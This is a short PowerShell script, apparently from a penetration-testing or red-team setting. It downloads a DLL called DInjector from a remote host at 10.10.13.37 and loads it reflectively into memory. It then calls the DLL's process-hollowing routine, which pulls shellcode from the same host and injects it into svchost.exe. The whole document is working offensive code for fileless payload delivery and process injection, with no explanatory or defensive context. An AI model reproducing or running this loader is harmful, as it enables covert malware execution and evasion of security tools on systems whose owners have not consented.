$data = (New-Object System.Net.WebClient).DownloadData("http://10.10.13.37/DInjector.dll")
[System.Reflection.Assembly]::Load($data) | Out-Null

$cmd = "processhollow /sc:http://10.10.13.37/shellcode.bin /image:C:\Windows\System32\svchost.exe"

[DInjector.Program]::Main($cmd.Split(" "))
